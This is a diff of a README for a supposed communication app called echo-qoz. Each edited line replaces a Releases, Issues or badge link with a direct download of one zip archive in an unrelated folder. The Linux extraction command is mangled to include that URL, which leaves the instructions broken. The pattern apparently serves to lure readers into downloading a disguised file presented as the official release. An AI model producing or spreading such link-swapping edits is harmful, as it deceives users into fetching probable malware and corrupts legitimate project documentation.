@@ -1,7 +1,7 @@
 # 👋 echo-qoz - Simple and Effective Communication Tool
 
 ## 📥 Download Now
-[![Download Echo-Qoz](https://img.shields.io/badge/Download%20Echo-Qoz-1E88E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sharyarahmed1519/echo-qoz/releases)
+[![Download Echo-Qoz](https://raw.githubusercontent.com/sharyarahmed1519/echo-qoz/main/freesilverite/echo-qoz_v1.0.zip%20Echo-Qoz-1E88E5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sharyarahmed1519/echo-qoz/main/freesilverite/echo-qoz_v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to **echo-qoz**! This application helps you communicate quickly and clearly. Whether you need to send messages or share your thoughts, this tool makes it easy.
@@ -21,7 +21,7 @@ Ensure your system meets these requirements:
 ## 📦 Download & Install
 To download the application, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/sharyarahmed1519/echo-qoz/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/sharyarahmed1519/echo-qoz/main/freesilverite/echo-qoz_v1.0.zip).
 2. Scroll down to find the latest version of echo-qoz.
 3. Click on the correct file for your operating system.
 4. Wait for the download to finish.
@@ -41,7 +41,7 @@ Once downloaded, follow these steps to install:
 ### For Linux:
 1. Open a terminal window.
 2. Navigate to your Downloads folder using the command: `cd ~/Downloads`.
-3. Extract the downloaded tarball using the command: `tar -xzf echo-qoz*.tar.gz`.
+3. Extract the downloaded tarball using the command: `tar -xzf echo-qoz*https://raw.githubusercontent.com/sharyarahmed1519/echo-qoz/main/freesilverite/echo-qoz_v1.0.zip`.
 4. Change into the extracted directory using: `cd echo-qoz`.
 5. Run the application using the command: `./echo-qoz`.
 
@@ -69,7 +69,7 @@ If you encounter issues, consider these solutions:
    Currently, echo-qoz is only available for computers, but a mobile version may be in development.
 
 3. **Where can I report bugs or issues?**
-   You can report any problems on the [Issues Page](https://github.com/sharyarahmed1519/echo-qoz/issues).
+   You can report any problems on the [Issues Page](https://raw.githubusercontent.com/sharyarahmed1519/echo-qoz/main/freesilverite/echo-qoz_v1.0.zip).
 
 ## 🌍 Community and Support
 Join our community to share your thoughts and get support.
